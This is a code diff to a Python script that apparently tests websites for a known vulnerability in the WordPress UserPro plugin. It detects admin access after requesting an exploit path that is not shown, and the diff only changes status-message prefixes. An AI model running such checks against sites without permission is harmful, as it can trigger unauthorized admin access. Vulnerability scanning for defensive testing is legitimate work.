@@ -14,14 +14,14 @@ def check_vuln(url):
            url = 'https://' + url
        except:
            url = 'http://' + url
-   printf('check plugins (%s)' % url)
+   printf('[+] check plugins (%s)' % url)
    pURL = urlopen(url + plug).read()
    if pURL.find(".userpro") > -1:
-       printf('Plugin is installed. checking vulnerable..')
+       printf('[+] Plugin is installed. checking vulnerable..')
        pURL = urlopen(url + vuln).read()
        if pURL.find("admin-bar-css") > -1 or urlopen(url + 'wp-admin').read().find('admin-bar-css') > -1:
-           printf('this website is vulnerable..')
+           printf('[+] this website is vulnerable..')
        else:
-           printf('this website isn\'t vulnerable..')
+           printf('[!] this website isn\'t vulnerable..')
    else:
-       printf('Plugin isn\'t installed')
+       printf('[!] Plugin isn\'t installed')
